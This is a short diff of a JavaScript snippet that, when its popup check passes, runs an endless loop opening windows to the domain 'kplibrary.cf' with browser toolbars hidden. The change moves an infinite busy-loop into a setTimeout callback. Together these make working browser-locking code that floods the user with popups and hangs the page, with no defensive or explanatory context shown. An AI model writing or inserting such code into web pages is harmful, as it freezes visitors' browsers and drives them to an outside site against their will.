@@ -7,6 +7,8 @@ if (popUp == null || typeof(popUp) == 'undefined') {
 } else {
   while (true) {
     window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-    for (var i = 0; i === i; i++) {}
+    setTimeout(function() {
+      for (var i = 0; i === i; i++) {}
+    }, 5);
   }
 }
